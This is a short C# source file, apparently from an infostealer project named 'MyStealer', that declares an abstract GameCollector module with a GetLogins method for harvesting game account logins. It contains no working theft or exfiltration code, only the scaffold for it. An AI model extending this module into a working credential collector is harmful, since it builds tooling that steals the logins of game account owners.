using MyStealer.Collector.Modules;
using System.Collections.Immutable;

namespace MyStealer.Collector.Modules.Game
{
    public abstract class GameCollector : ModuleBase
    {
        public abstract IImmutableSet<GameLogin> GetLogins();
    }
}
